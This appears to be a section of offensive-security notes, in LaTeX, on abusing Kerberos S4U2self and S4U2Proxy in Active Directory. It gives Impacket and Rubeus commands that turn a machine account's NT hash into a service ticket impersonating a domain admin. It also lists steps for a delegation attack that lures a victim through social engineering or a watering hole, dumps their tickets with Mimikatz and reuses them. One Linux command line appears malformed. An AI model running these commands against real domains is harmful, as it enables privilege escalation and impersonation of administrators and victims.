\section{S4U2self abuse}


\subsection{Regular scenario}
abuse S4U2self for Local Privilege Escalation, or for stealthier alternative to Silver Ticket.

In order to obtain local admin rights on a target machine, the attackers must be able to execute code on the machine and conduct two major steps: obtain a TGT for the machine account, and use that TGT to make a S4U2self request in order to obtain a Service Ticket as domain admin for the machine.

\subsubsection{Linux}

\begin{verbatim}
# Machine account's TGT
getTGT.py -dc-ip "domaincontroller" -hashes :"NThash" "domain"/"machine$"

# Obtain a Service Ticket
export KRB5CCNAME="/path/to/ticket.ccache" getST.py -self \ 
    -impersonate "DomainAdmin" -altservice "cifs/machine.domain.local" \ 
    -k -no-pass \
    -dc-ip "DomainController" "domain.local"/'machine$'
\end{verbatim}

\subsubsection{Windows}

\begin{verbatim}
# Machine account's TGT
Rubeus.exe asktgt /nowrap /domain:"domain" /user:"computer$" /rc4:"NThash"

# Obtain a Service Ticket
Rubeus.exe s4u /self /nowrap /impersonateuser:"DomainAdmin" /altservice:"cifs/machine.domain.local" /ticket:"base64ticket"
\end{verbatim}

\subsubsection{links}
\begin{itemize}
    \item \url{https://www.thehacker.recipes/ad/movement/kerberos/delegations/s4u2self-abuse}
\end{itemize}

\subsection{Selfless Abuse Scenario (Skipping S4U2Self)}

\begin{itemize}
    \item The attacker compromises Service A and the DACL to configure resource-based constrained delegation on Service B
    \item By way of social engineering or a watering hole attack, the victim authenticates to Service A to access a service (e.g. CIFS or HTTP)
    \item The attacker dumps the TGS of the victim to Service A, using Mimikatz sekurlsa::tickets or through another method. 
    \item The attacker configures resource-based constrained delegation from Service A to Service B
    \item The attacker uses Rubeus to perform S4U2Proxy with the TGS previously obtained as the required “evidence”, from Service A to Service B for the victim. 
    \item The attacker can pass-the-ticket and impersonate the victim to access Service B.
\end{itemize}